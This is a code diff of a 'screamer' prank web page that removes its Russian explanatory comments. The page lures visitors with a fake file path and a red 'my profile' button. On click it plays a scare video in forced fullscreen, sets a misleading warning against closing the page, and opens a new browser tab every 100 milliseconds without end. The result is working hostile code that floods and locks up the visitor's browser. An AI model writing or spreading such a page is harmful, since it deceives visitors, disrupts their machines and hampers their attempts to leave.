@@ -7,26 +7,25 @@
 <style type="text/css">
     body {
         margin: 0;
-        overflow: hidden; /* Предотвращаем скролл, если контент выйдет за пределы */
+        overflow: hidden; 
         font-family: sans-serif;
     }
     *, *::before, *::after {
         box-sizing: border-box;
     }
 
-    /* Стили для контейнера с кнопкой "кликбейт" */
     #clickbait-container {
         position: fixed;
         top: 0;
         left: 0;
         height: 100vh;
         width: 100vw;
-        background-color: black; /* Черный фон, чтобы ничего не было видно до клика */
-        display: flex; /* Используем flexbox для центрирования кнопки */
+        background-color: black; 
+        display: flex; 
         justify-content: center;
         align-items: center;
-        z-index: 100; /* Убедимся, что контейнер с кнопкой поверх всего */
-        color: white; /* Цвет текста */
+        z-index: 100; 
+        color: white; 
         flex-direction: column;
         gap: 20px;
         text-align: center;
@@ -37,7 +36,7 @@
         padding: 20px 40px;
         font-size: 2em;
         cursor: pointer;
-        background-color: #ff0000; /* Красная кнопка, привлекающая внимание */
+        background-color: #ff0000; 
         color: white;
         border: none;
         border-radius: 10px;
@@ -55,7 +54,6 @@
         box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
     }
 
-    /* Изначально скрываем видео-контейнер */
     #scare-video-container {
         position: fixed;
         top: 0;
@@ -79,14 +77,12 @@
 </head>
 <body>
 
-<!-- Контейнер с "кликбейт" кнопкой, который виден в начале -->
 <div id="clickbait-container">
     <h1>C:\Users\SystemX\Pictures\Saved Pictures\03.03.2026.png</h1>
     <p> </p>
     <button id="start-button">my profile</button>
 </div>
 
-<!-- Основной "пугающий" контент (видео), который изначально скрыт -->
 <div id="scare-video-container">
     <video id="video" src="media/video.mp4" loop playsinline></video>
 </div>
@@ -98,25 +94,21 @@
     const clickbaitContainer = document.getElementById("clickbait-container");
     const scareVideoContainer = document.getElementById("scare-video-container");
 
-    // Отладочные логи: Проверяем, найдены ли элементы
     console.log("Элементы:");
     console.log("video:", video);
     console.log("startButton:", startButton);
     console.log("clickbaitContainer:", clickbaitContainer);
     console.log("scareVideoContainer:", scareVideoContainer);
 
-    // Предупреждение при закрытии страницы
     window.addEventListener('beforeunload', function(e) {
         e.preventDefault();
         e.returnValue = 'Ваши данные могут не сохраниться, точно закрыть?';
         return 'Ваши данные могут не сохраниться, точно закрыть?';
     });
 
-    // Функция для запроса полноэкранного режима и разглушения видео
     function requestFullscreenAndUnmute() {
         console.log("Attempting to request fullscreen and unmute.");
         
-        // Если видео заглушено, разглушаем его при пользовательском клике
         if (video.muted) {
             video.muted = false;
             console.log("Video unmuted by user interaction.");
@@ -125,42 +117,32 @@
         const { documentElement } = document;
         if(documentElement.requestFullscreen) {
             documentElement.requestFullscreen();
-        } else if(documentElement.mozRequestFullScreen) { // Firefox
+        } else if(documentElement.mozRequestFullScreen) { 
             documentElement.mozRequestFullScreen();
-        } else if(documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+        } else if(documentElement.webkitRequestFullscreen) { 
             documentElement.webkitRequestFullscreen();
-        } else if(documentElement.msRequestFullscreen) { // IE/Edge
+        } else if(documentElement.msRequestFullscreen) { 
             documentElement.msRequestFullscreen();
         }
     }
 
-    // Функция для открытия новой вкладки
     function openNewTab() {
         console.log("Attempting to open new tab:", targetUrl);
         window.open(targetUrl, '_blank');
     }
 
-    // Функция, которая запускает всю "пугающую" последовательность
     function startScareSequence() {
         console.log("startScareSequence() called.");
 
-        // Скрываем контейнер с кнопкой
         clickbaitContainer.style.display = 'none';
-        // Показываем контейнер с видео
         scareVideoContainer.style.display = 'block';
         console.log("Containers visibility toggled.");
 
-        // === ВАЖНО: Принудительно заглушаем видео для автоплея ===
         video.muted = true; 
         
-        // Запускаем видео
         video.play()
             .then(() => {
                 console.log("Video playback started successfully (muted).");
-                // Запрашиваем полноэкранный режим после успешного старта видео
-                // Этот programmatic вызов requestFullscreenAndUnmute может не разглушить видео
-                // из-за политик браузера, но он попытается войти в фуллскрин.
-                // Разглушение гарантировано при *последующем* клике по видео.
                 requestFullscreenAndUnmute(); 
             })
             .catch(error => {
@@ -168,14 +150,12 @@
                 alert("Не удалось запустить видео автоматически. Пожалуйста, кликните по экрану.");
             });
         
-        // Начинаем открывать вкладки через секунду после загрузки
         setTimeout(() => {
             console.log("Starting to open new tabs after 1 second...");
             setInterval(openNewTab, 100);
         }, 1000);
     }
 
-    // Добавляем обработчик события для "кликбейт" кнопки
     if (startButton) {
         startButton.addEventListener('click', startScareSequence);
         console.log("Event listener added to start Button.");
@@ -183,9 +163,6 @@
         console.error("startButton not found!");
     }
 
-    // Добавляем обработчик события для видео: при клике на него
-    // будет попытка войти в полноэкранный режим и разглушить видео.
-    // Этот клик считается пользовательским взаимодействием.
     if (video) {
         video.addEventListener("click", requestFullscreenAndUnmute);
         console.log("Event listener added to video for fullscreen and unmute.");
